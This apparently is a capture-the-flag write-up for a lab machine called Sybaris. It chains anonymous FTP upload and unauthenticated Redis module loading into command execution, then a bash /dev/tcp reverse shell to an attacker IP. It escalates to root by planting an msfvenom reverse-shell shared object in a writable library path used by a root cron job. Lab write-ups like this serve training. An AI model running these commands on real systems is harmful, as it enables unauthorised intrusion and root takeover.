# Sybaris

### Enumeration

```
21/tcp    open   ftp       vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0               6 Apr 01  2020 pub [NSE: writeable]
...
6379/tcp  open   redis     Redis key-value store 5.0.9
...
```

### Initial Access

```
$ redis-cli -h 192.168.71.93
```

No need password. We can get a shell with Redis RCE.

[https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#load-redis-module](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#load-redis-module)

```
$ git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
$ cd RedisModules-ExecuteCommand 
$ make
$ cp module.so ../
```

```
ftp> put module.so
```

We can assume pub dir in base ftp dir which is /var/ftp.

```
$ redis-cli -h 192.168.71.93
192.168.71.93:6379> MODULE LOAD /var/ftp/pub/module.so
OK
192.168.71.93:6379> MODULE LIST
1) 1) "name"
   2) "system"
   3) "ver"
   4) (integer) 1
192.168.71.93:6379> system.exec "whoami"
"pablo\n"
```

https://www.revshells.com/ - Bash 196 - 192.168.49.71 80 /bin/bash

```
0<&196;exec 196<>/dev/tcp/192.168.49.71/80; /bin/bash <&196 >&196 2>&196
```

```
192.168.71.93:6379> system.exec "0<&196;exec 196<>/dev/tcp/192.168.49.71/80; /bin/bash <&196 >&196 2>&196"
```

### PrivEsc

Getting stable shell.

```
[pablo@sybaris users]$ pwd
/var/www/html/config/users

[pablo@sybaris users]$ cat pablo.ini
password = [REDACTED]
role = admin
```

ssh -> pablo:\[REDACTED]

```
[pablo@sybaris html]$ cat /etc/crontab
...
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
...
  *  *  *  *  * root       /usr/bin/log-sweeper
  
[pablo@sybaris html]$ /usr/bin/log-sweeper
/usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory

[pablo@sybaris html]$ ldd /usr/bin/log-sweeper
        linux-vdso.so.1 =>  (0x00007ffce1f9a000)
        utils.so => not found
        libc.so.6 => /lib64/libc.so.6 (0x00007f0ece0d4000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f0ece4a2000)
```

There is a missing shared library which is utils.so. According to the crontab, there is a writable dir which is /usr/local/lib/dev(Ref. LD\_LIBRARY\_PATH). We can use this situation to get root shell.

[https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library](https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library)

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.71 LPORT=80 -f elf-so -o utils.so
```

```
[pablo@sybaris dev]$ pwd
/usr/local/lib/dev
[pablo@sybaris dev]$ wget http://192.168.49.71/utils.so
```

In a minute, we could get root shell.
